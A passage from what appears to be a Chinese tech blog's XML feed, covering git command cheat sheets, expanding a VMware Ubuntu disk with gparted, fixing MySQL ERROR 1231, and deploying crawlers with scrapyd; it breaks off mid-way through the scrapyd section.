回滚上一个版本</span></span><br><span class="line">git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回滚上两个版本</span></span><br><span class="line">git reset --hard HEAD^^</span><br><span class="line"></span><br><span class="line"><span class="comment"># 回退到指定版本，git log 就能看到commit id了</span></span><br><span class="line">git reset --hard <span class="string">&#x27;commit id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 回滚版本是不保存在 git log，如果想查看使用</span></span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure><hr><h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 撤销当前目录下所有文件的改动</span></span><br><span class="line">git checkout -- .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销指定文件修改</span></span><br><span class="line">git checkout -- README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存区回到工作区, 指定 ./README.md 文件从暂存区回到工作区</span></span><br><span class="line">git reset HEAD ./README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销commit, 回到工作区, 一般commit id 是前一个</span></span><br><span class="line">git reset &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 撤销commit, 并且把修改同时撤销</span></span><br><span class="line">git reset --hard &lt;commit_id&gt;</span><br></pre></td></tr></table></figure><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出本地所有标签</span></span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出远程所有标签</span></span><br><span class="line">git ls-remote --tags origin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照特定模式查找标签, `*` 模板搜索</span></span><br><span class="line">git tag -l <span class="string">&quot;v1.0.0*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建带有附注标签</span></span><br><span class="line">git tag -a v1.1.0 -m <span class="string">&quot;标签描述&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建轻量标签, 不需要带任何参数</span></span><br><span class="line">git tag v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后期打标签, 假设之前忘记打标签了，可以通过git log查看commit id</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git tag -a v1.1.0 &lt;commit_id&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程，默认只是本地创建</span></span><br><span class="line">git push origin v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一次性推送所有标签到远程</span></span><br><span class="line">git push origin --tags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除标签, 你需要再次运行 git push origin v1.1.0 才能删除远程标签</span></span><br><span class="line">git tag -d v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程标签</span></span><br><span class="line">git push origin --delete v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查标签</span></span><br><span class="line">git checkout v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地某个标签详细信息</span></span><br><span class="line">git show v1.1.0</span><br></pre></td></tr></table></figure><h2 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h2><p><code>git rebase</code> 主要作用可以将多个commit记录合并为一条</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 操作最近4次提交</span></span><br><span class="line">git rebase -i HEAD~4</span><br><span class="line"><span class="comment"># 或者以 commit_id 进行操作</span></span><br><span class="line">git rebase -i e88835de905ad396f61a0dc8c040a8ac8a34f3f8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 放弃 git rebase 操作</span></span><br><span class="line">git rebase --abort</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此命令主要用于解决冲突后继续执行</span></span><br><span class="line">git rebase --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.xiejiahe.com/blog/detail/5d550e8553d11b2c3ca05cbe">git rebase将多次commit合并为一条</a></p><h2 id="git-flow"><a href="#git-flow" class="headerlink" title="git-flow"></a>git-flow</h2><p><code>git flow</code> 不是内置命令，需要单独安装</p><p><strong>初始化</strong> 每个仓库都必须初始化一次</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通常直接回车以完成默认设置</span></span><br><span class="line">git flow init</span><br></pre></td></tr></table></figure><p><strong>功能</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启新的功能</span></span><br><span class="line">git flow feature start v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程, 在团队协作中这一步少不了</span></span><br><span class="line">git flow feature publish v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成功能, 会将当前分支合并到 develop 然后删除分支，回到 develop</span></span><br><span class="line">git flow feature finish v1.1.0</span><br></pre></td></tr></table></figure><p><strong>打补丁</strong></p><p>hotfix是针对 <code>master</code> 进行打补丁的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启新的 hotfix</span></span><br><span class="line">git flow hotfix start v1.1.0_hotifx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程</span></span><br><span class="line">git flow hotfix publish v1.1.0_hotifx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成新的hotfix, 将当前分支合并到 master 和 develop，然后删除分支，回到 develop</span></span><br><span class="line">git flow hotfix finish v1.1.0_hotifx</span><br></pre></td></tr></table></figure><p><strong>发布</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启新的 release</span></span><br><span class="line">git flow release start v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送到远程</span></span><br><span class="line">git flow release publish v1.1.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成, 将当前分支合并到 master 和 develop，删除当前分支然后回到 develop</span></span><br><span class="line">git flow release finish v1.1.0</span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow">https://www.atlassian.com/git/tutorials/comparing-workflows/gitflow-workflow</a></li><li><a href="https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/git-flow">https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/git-flow</a></li></ul><h4 id="Git-flow-schema"><a href="#Git-flow-schema" class="headerlink" title="Git flow schema"></a>Git flow schema</h4><p><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/git-flow.png"></p><hr><h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><p>具体使用还可以看这里 <a href="https://www.xiejiahe.com/blog/detail/5dbceefc0bb52b1c88c30853">git submodule子模块使用教程</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加子模块</span></span><br><span class="line">git submodule add https://github.com/xjh22222228/git-manual.git</span><br><span class="line">git submodule add https://github.com/xjh22222228/git-manual.git submodules/git-manual  <span class="comment"># 添加到指定目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新，有2种方法</span></span><br><span class="line"><span class="comment"># 一步到位</span></span><br><span class="line">git submodule update --remote</span><br><span class="line"><span class="comment"># 或者进入到子模块项目再拉取</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修复子模块分支指向 detached head</span></span><br><span class="line">git submodule foreach -q --recursive <span class="string">&#x27;git checkout $(git config -f $toplevel/.gitmodules submodule.$name.branch || echo master)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除子模块 common 为子模块名称，一般删除需要三部</span></span><br><span class="line">git submodule deinit &lt;common&gt;</span><br><span class="line"><span class="comment"># 清除子模块缓存</span></span><br><span class="line">git rm --cached common</span><br><span class="line"><span class="comment"># 提交代码并推送</span></span><br><span class="line">git commit -am <span class="string">&quot;Remove a submodule&quot;</span> &amp;&amp; git push</span><br></pre></td></tr></table></figure><h2 id="Bisect"><a href="#Bisect" class="headerlink" title="Bisect"></a>Bisect</h2><p><code>Bisect</code> 二分查找, 用于定位引入Bug的commit，主要4个命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开始</span></span><br><span class="line">git bisect start [终点] [起点] <span class="comment"># 通过 git log 确定起点和终点</span></span><br><span class="line">git bisect start HEAD 4d83cf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录这次的commit是好的</span></span><br><span class="line">git bisect good</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录这次的commit是坏的</span></span><br><span class="line">git bisect bad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">git bisect reset</span><br></pre></td></tr></table></figure><p>参考 <a href="https://github.com/bradleyboy/bisectercise">https://github.com/bradleyboy/bisectercise</a></p><h2 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 详细打印所有git命令</span></span><br><span class="line">git <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有git命令, 此命令不会有详细信息，更清晰一些</span></span><br><span class="line">git <span class="built_in">help</span> -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有可配置的变量</span></span><br><span class="line">git <span class="built_in">help</span> -c</span><br></pre></td></tr></table></figure><h2 id="清空commit历史"><a href="#清空commit历史" class="headerlink" title="清空commit历史"></a>清空commit历史</h2><p>假设当前分支是 <code>develop</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、新建一个新分支</span></span><br><span class="line">git checkout --orphan new_branch</span><br><span class="line"><span class="comment"># 2、暂存所有文件并提交</span></span><br><span class="line">git add -A &amp;&amp; git commit -m <span class="string">&quot;First commit&quot;</span></span><br><span class="line"><span class="comment"># 3、删除本地 develop 分支</span></span><br><span class="line">git branch -D develop</span><br><span class="line"><span class="comment"># 4、再将 new_branch 分支重命名为 develop</span></span><br><span class="line">git branch -m develop</span><br><span class="line"><span class="comment"># 5、强制将 develop 分支推送到远程</span></span><br><span class="line">git push -f origin develop</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看git版本</span></span><br><span class="line">git --version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看远程仓库地址</span></span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记住提交账号密码</span></span><br><span class="line">git config --global credential.helper store</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除git已保存的用户名和密码</span></span><br><span class="line"><span class="comment"># windows</span></span><br><span class="line">git credential-manager uninstall</span><br><span class="line"><span class="comment"># mac linux</span></span><br><span class="line">git config --global credential.helper <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> credential.helper</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除本地git缓存</span></span><br><span class="line">git rm -r --cached .</span><br></pre></td></tr></table></figure><h2 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h2><p><strong>美化 <code>git log</code>, 直逼GUI</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、全局配置</span></span><br><span class="line">git config --global alias.lg <span class="string">&quot;log --color --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit&quot;</span></span><br><span class="line"><span class="comment"># 2、输入下面命令, 日志变得非常直观化</span></span><br><span class="line">git lg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里另外提供几种模式, 可以选择喜欢的一种进行别名配置</span></span><br><span class="line">git config --global alias.lg <span class="string">&quot;log --graph --pretty=format:&#x27;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#x27; --abbrev-commit --date=relative&quot;</span></span><br><span class="line"></span><br><span class="line">git config --global alias.his <span class="string">&quot;log --graph --decorate --oneline --pretty=format:&#x27;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#x27; --abbrev-commit --date=format:&#x27;%Y-%m-%d %H:%M:%S&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">git config --global alias.hist <span class="string">&quot;log --graph --decorate --oneline --pretty=format:&#x27;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d  %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#x27; --abbrev-commit --date=format:&#x27;%Y-%m-%d %H:%M:%S&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>效果图</p><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/git-log.png" width="400" /><hr><hr><p><strong>附上一张鹅厂的 git 思维导图</strong></p><p><img src="https://raw.githubusercontent.com/xjh22222228/git-manual/master/media/map.jpg"></p><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>MIT</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware下利用gparted对虚拟机Ubuntu系统所在分区sda1进行磁盘扩容</title>
      <link href="2020/06/02/2020-06-02-vmware_ubuntu_expand_disk/"/>
      <url>2020/06/02/2020-06-02-vmware_ubuntu_expand_disk/</url>
      
        <content type="html"><![CDATA[<h2 id="VMware下利用gparted对虚拟机Ubuntu系统所在分区sda1进行磁盘扩容"><a href="#VMware下利用gparted对虚拟机Ubuntu系统所在分区sda1进行磁盘扩容" class="headerlink" title="VMware下利用gparted对虚拟机Ubuntu系统所在分区sda1进行磁盘扩容"></a>VMware下利用gparted对虚拟机Ubuntu系统所在分区sda1进行磁盘扩容</h2><p>最近由于用ubuntu18开发越来越多，系统盘不够用了，以至于只剩0字节，连张图都存不进去。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/none_space.png"></p><p>之前已经尝试各种方法对ubuntu系统进行清理，能暂时清理出几百M或者几个G的空间，但是终究不是长久之计。</p><p>所以利用gparted对系统盘sda1进行扩容。</p><h3 id="虚拟机硬盘扩容"><a href="#虚拟机硬盘扩容" class="headerlink" title="虚拟机硬盘扩容"></a>虚拟机硬盘扩容</h3><p>虚拟机硬盘扩容有两种方式，但是注意了， 保存过的快照的，无法进行扩容操作，删除快照才可以。</p><p>首先要保证虚拟机处于关闭状态，然后点开虚拟机设置里的硬盘选项卡，扩展硬盘容量之后保存并退出。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/849394-20161229150447476-1823922437.png"></p><h3 id="gparted"><a href="#gparted" class="headerlink" title="gparted"></a>gparted</h3><p>首先安装gparted: </p><pre><code>sudo apt-get install gparted</code></pre><p>启动gparted:</p><pre><code>sudo gparted</code></pre><p>可以看到gparted界面如下</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/gparted123.png"></p><p>上图是我将系统盘从20G扩展到70G之后的样子。</p><p>如果是刚执行完虚拟机硬盘扩容操作，应该在磁盘最后有unallocated未分配的大量空间。</p><p>如果你只有系统盘，那么扩容后直接可以对系统盘扩展，只需右键sda1然后resize大小即可。</p><p>但如果有个人资料空间，那么就需要注意了，在GParted中只能对相邻的磁盘块进行操作，目标是将图中的【未分配】磁盘块合并到【/dev/sda1】中，因此需将个人资料空间后移。我的办法是将整个磁盘复制到新扩展的空间，然后将原先的个人资料空间50G合并到sda1上。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql ERROR 1231 问题原因及解决方法</title>
      <link href="2020/06/02/2020-06-02-mysql_error_1231/"/>
      <url>2020/06/02/2020-06-02-mysql_error_1231/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql-ERROR-1231-问题原因及解决方法"><a href="#mysql-ERROR-1231-问题原因及解决方法" class="headerlink" title="mysql ERROR 1231 问题原因及解决方法"></a>mysql ERROR 1231 问题原因及解决方法</h2><p>报错如下：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20190515085345198.png"></p><h3 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h3><p>原因1：常见于mysql数据库中执行source导入太大的sql文件的情况，原因是由于执行的sql文件过大，超过max_allowed_packet的值导致失败。<br>原因2：sql头部丢失</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>对于原因1：</p><p>修改max_allowed_packet的值</p><p>如不设置此参数，通常默认为4M</p><p>max_allowed_packet 最大值是1G(1073741824) 设置超过1G，最终结果也只有1G</p><p>方法一：临时修改</p><p>&lt;1&gt;查看当前max_allowed_packet的值</p><pre><code>show variables like &#39;max_allowed_packet&#39;;</code></pre><p>or</p><pre><code>select @@max_allowed_packet;</code></pre><p>&lt;2&gt;数据库中临时修改（重启数据库后失效）</p><p>下列演示的是20M的设置，可根据需求设置，要大于执行的sql文件大小</p><p>不直接使用set global max_allowed_packet=20M的原因是：命令行进行修改时，通常要算成字节数设置</p><pre><code>set global max_allowed_packet = 20 * 1024 * 1024;</code></pre><p>or </p><pre><code>set global max_allowed_packet = 2 * 1024 * 1024 * 10;</code></pre><p>exit退出数据库，再重新进入，即可生效</p><p>方法二：持久化修改</p><p>&lt;1&gt;修改该数据库配置文件</p><p>通常是/etc/my.cnf，根据实际情况修改配置文件</p><p>下列演示的是20M的设置，可根据需求设置</p><pre><code>vim /etc/my.cnf[mysqld]max_allowed_packet = 1024M</code></pre><p>或者</p><pre><code>max_allowed_packet = 1G</code></pre><p>&lt;2&gt;重启数据库</p><p>根据安装方法不同，重启方法不同，通常为下列命令</p><pre><code>service mysql restartsystemctl restart mysql</code></pre><p>&lt;3&gt;进入数据库后，查看是否生效</p><pre><code>show variables like &#39;max_allowed_packet&#39;;</code></pre><p>对于原因2：</p><p>在头部添加</p><pre><code>/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;/*!40101 SET NAMES utf8 */;/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;/*!40103 SET TIME_ZONE=&#39;+00:00&#39; */;/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */;/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 scrapyd 管理爬虫</title>
      <link href="2020/06/02/2020-06-02-scrapyd_manage_spiders/"/>
      <url>2020/06/02/2020-06-02-scrapyd_manage_spiders/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-scrapyd-管理爬虫"><a href="#使用-scrapyd-管理爬虫" class="headerlink" title="使用 scrapyd 管理爬虫"></a>使用 scrapyd 管理爬虫</h2><h3 id="scrapyd简介"><a href="#scrapyd简介" class="headerlink" title="scrapyd简介"></a>scrapyd简介</h3><p>scrapyd 是由 scrapy 官方提供的爬虫管理工具，使用它我们可以非常方便地上传、控制爬虫并且查看运行日志。</p><p><a href="https://scrapyd.readthedocs.io/en/latest/index.html">官方文档</a></p><p>使用scrapyd 和我们直接运行 </p><pre><code>scrapy crawl myspider</code></pre><p>有什么区别呢？</p><p>scrapyd 同样是通过上面的命令运行爬虫的，不同的是它提供一个JSON web service 监听的请求。我们可以从任何一台可以连接到服务器的电脑发送请求安排爬虫运行，或者停止正在运行的爬虫。甚至，我们可以使用它提供的API上传新爬虫而不必登录到服务器上进行操作。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>pip install scrapyd</code></pre><h3 id="运行-scrapyd-服务"><a href="#运行-scrapyd-服务" class="headerlink" title="运行 scrapyd 服务"></a>运行 scrapyd 服务</h3><p>直接运行命令scrapyd即可：</p><pre><code>scrapyd[-] Scrapyd web console available at http://127.0.0.1:6800/</code></pre><p>默认情况下scrapyd 监听 127.0.0.1:6800 端口，运行scrapyd 后在浏览器<a href="http://localhost:6800/">http://localhost:6800/</a> 即可查看到当前可以运行的项目：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/scrapyd1.png"></p><h3 id="部署-scrapy-项目"><a href="#部署-scrapy-项目" class="headerlink" title="部署 scrapy 项目"></a>部署 scrapy 项目</h3><p>直接使用scrapyd-client提供的scrapyd-deploy工具.</p><pre><code>pip install scrapyd-client</code></pre><p>修改工程目录下的 scrapy.cfg 文件</p><pre><code>[settings]default = secnews_spiders.settings[deploy:secnews_spiders]  #默认情况下并没有secnews_spiders，它只是一个名字，可以在配置文件中写多个名字不同的deployurl = http://localhost:6800/ #要部署项目的服务器的地址project = secnews_spidersusername = testpassword = test</code></pre><h4 id="部署项目到服务器"><a href="#部署项目到服务器" class="headerlink" title="部署项目到服务器"></a>部署项目到服务器</h4><p>直接在项目根目录：</p><pre><code>Windows:python c:\Python27\Scripts\scrapyd-deployUbuntu:scrapyd-deploy secnews_spiders -p secnews_spiders</code></pre><p>此时可能遇到错误</p><pre><code>ScrapyDeprecationWarning: Module `scrapy.utils.http` is deprecated, Please import from `w3lib.http` instead.from scrapy.utils.http import basic_auth_header</code></pre><p>报错已经说明，由于底层scrapyd-deploy的模块’scrapy.utils.http’已经弃用，建议更新为’w3lib.http’替代。</p><p>将python环境中script以及lib中scrapyd-client中scrapyd-deploy文件中23行注释掉</p><pre><code># from scrapy.utils.http import basic_auth_header</code></pre><p>更换为</p><pre><code>from w3lib.http import basic_auth_header</code></pre><p>如果没有遇到错误，则返回</p><pre><code>$ scrapyd-deploy secnews_spiders -p secnews_spidersPacking version 1591065293Deploying to project &quot;secnews_spiders&quot; in http://localhost:6800/addversion.jsonServer response (200):&#123;&quot;node_name&quot;: &quot;ubuntu&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;project&quot;: &quot;secnews_spiders&quot;, &quot;version&quot;: &quot;1591065293&quot;, &quot;spiders&quot;: 32&#125;</code></pre><p>注意：如果遇到错误 </p><pre><code>Deploy failed: &lt;urlopen error [Errno 111] Connection refused&gt;</code></pre><p>请检查是否运行scrapyd服务，如果没有，打开另外一个窗口输入 scrapyd 命令启动scrapyd，再打开窗口输入 scrapyd-deploy 命令。</p><p>部署操作会打包你的当前项目，如果当前项目下有setup.py文件，就会使用它，没有的会就会自动创建一个。(如果后期项目需要打包的话，可以根据自己的需要修改里面的信息，也可以暂时不管它).从返回的结果里面，可以看到部署的状态，项目名称，版本号和爬虫个数，以及当前的主机名称.</p><p>现在即可访问127.0.0.1:6800</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/scrapyd_deploy.png"></p><p>可以看到 Available projects中多了secnews_spiders。</p><p>查看项目spider</p><pre><code>scrapy list</code></pre><p>查看当前目录下的可以使用的部署方式</p><pre><code>scrapyd-deploy -l</code></pre><p>对于不同的scrapy爬虫，只需要在不同的工程目录下的修改对应的 scrapy.cfg 文件，并且在不同的工程目录下加入对应项目</p><pre><code>cd tornews_spidersscrapyd-deploy tornews_spiders -p tornews_spiderscd vulninfo_spidersscrapyd-deploy vulninfo_spiders -p vulninfo_spiders</code></pre><p>再次查看127.0.0.1:6800，发现多了项目tornews_spiders、vulninfo_spiders</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/scrapyd_deploy2.png"></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>scrapyd的web界面比较简单，主要用于监控，所有的调度工作全部依靠接口实现.</p><p><a href="http://scrapyd.readthedocs.org/en/stable/api.html">官方API文档</a></p><h4 id="开启爬虫-schedule"><a href="#开启爬虫-schedule" class="headerlink" title="开启爬虫 schedule"></a>开启爬虫 schedule</h4><pre><code>$ curl http://localhost:6800/schedule.json -d project=secnews_spiders -d spider=nosec&#123;&quot;node_name&quot;: &quot;ubuntu&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;jobid&quot;: &quot;4f00feb0a47a11ea8b7b000c29280ec4&quot;&#125;</code></pre><p>注意：执行时 cd 到项目根目录执行</p><h4 id="停止-cancel"><a href="#停止-cancel" class="headerlink" title="停止 cancel"></a>停止 cancel</h4><pre><code>$ curl http://localhost:6800/cancel.json -d project=secnews_spiders -d job=4f00feb0a47a11ea8b7b000c29280ec4</code></pre><h4 id="列出爬虫-listspiders"><a href="#列出爬虫-listspiders" class="headerlink" title="列出爬虫 listspiders"></a>列出爬虫 listspiders</h4><pre><code>curl http://localhost:6800/listspiders.json?project=secnews_spiders</code></pre><h4 id="删除项目-delproject"><a href="#删除项目-delproject" 